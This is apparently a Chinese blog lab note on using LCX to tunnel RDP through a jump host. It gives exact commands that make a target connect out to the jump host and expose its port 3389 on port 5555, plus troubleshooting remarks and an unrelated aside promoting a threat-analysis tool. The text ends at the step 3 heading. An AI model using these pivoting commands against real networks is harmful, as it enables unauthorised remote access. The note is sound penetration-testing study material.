ailx10说：这篇是我2020年8月写的。LCX 这篇，我把目标主动接跳板、跳板再暴露端口的顺序实际搭了一遍，想把远程桌面穿过中间那台机器。网络通了以后，域账号没成功，本地账号反而可以，进程还出现不稳定和被删除的情况。整个实验于是既要排连接，也要排账号和防护，远不止转发命令本身。笔记留下那些成功与失败的对照，方便后来判断是服务没开、认证不对，还是工具状态变了；三种问题看着都像“连不上”，背后却不是同一条路。

---

LCX slave从目标主动接跳板4444，listen暴露5555转目标本地3389；开启RDP后非域账号登录成功，域账号尝试失败且进程不稳被删。

核查提示：文件被删不证明误报或内核偷偷运行，Github来源也非绝对安全；本地账号需计算机名，配置RDP与网络转发分开排障。 原环境、代码和图内细节尚未逐项核验。

最近写了一个简单的威胁分析专家系统Gui图形界面工具，可以快速判断失陷主机，给出失陷隶属度，非常人性化，压缩包大小有20M。实际上，这个小工具可以帮助一线驻场人员，快速定位高危主机，并给所有主机进行威胁排名，指导现场进行威胁处置。采用多维度的打分算法，是整个系统的关键，也花了一点时间来调参。看着自己的小工具，还是蛮有成就感的，我准备明年写一点小游戏，这样大家都能体验我的开发成果\~

---

LCX 有不同版本及来源。安全软件告警不自动等于误报，下载来源也不能单独保证安全；应核对文件、来源和隔离测试结果。

工具来源需要独立核验；版本和完整性都应检查。

```
https://github.com/UndefinedIdentifier/LCX
```

## 步骤一：在目标机器上执行反射操作，反射到跳板机

```
Lcx.exe -slave 192.168.160.139 4444 127.0.0.1 3389
```

![](/notes-assets/1311f88d447f7b26760e.jpg)

## 步骤二：在跳板机上接收，即将3389端口映射成5555端口

```
Lcx.exe -listen 4444 5555
```

![](/notes-assets/e3f41ae51ea031aec87f.webp)

## 步骤三：在跳板机上通过5555端口建立到目标机器上的远程连接
